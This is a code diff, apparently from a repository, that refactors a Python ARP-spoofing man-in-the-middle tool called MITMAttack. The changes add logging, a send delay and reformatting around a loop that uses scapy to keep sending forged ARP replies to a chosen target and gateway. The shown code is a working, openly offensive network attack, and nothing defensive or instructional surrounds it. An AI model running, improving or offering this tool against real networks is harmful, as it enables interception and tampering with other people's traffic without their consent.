@@ -1,6 +1,12 @@
 import netifaces
 import ipaddress
 from scapy.all import ARP, Ether, sendp
+import logging
+import time
+
+logging.basicConfig(
+    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
+)
 
 
 class MITMAttack:
@@ -36,25 +42,25 @@ class MITMAttack:
             self.target_ip, self.gateway_ip, self.broadcast
         )
 
-        print("MITM Running... Press Ctrl+C to stop the attack.")
-
+        logging.info("MITM Running... Press Ctrl+C to stop the attack.")
         try:
             while True:
                 sendp(arp_response_target, iface=self.interface)
                 sendp(arp_response_gateway, iface=self.interface)
+                time.sleep(2)  # Add sleep to prevent overloading the network
         except KeyboardInterrupt:
-            print("\nMITM Attack Stopped.")
+            logging.info("\nMITM Attack Stopped.")
 
 
 if __name__ == "__main__":
-    # Interface could be something like 'eth0' or 'wlan0' on Linux, 'Wi-Fi' on Windows, etc.
-    interface = input("Enter the interface name: ")  
-
+    interface = input("Enter the interface name: ")
     target_ip = input("Enter the target IP address: ")
     gateway_ip = input("Enter the gateway IP address: ")
 
     try:
-        mitm = MITMAttack(target_ip=target_ip, gateway_ip=gateway_ip, interface=interface)
+        mitm = MITMAttack(
+            target_ip=target_ip, gateway_ip=gateway_ip, interface=interface
+        )
         mitm.run_attack()
     except ValueError as e:
-        print(e)
+        logging.error(e)
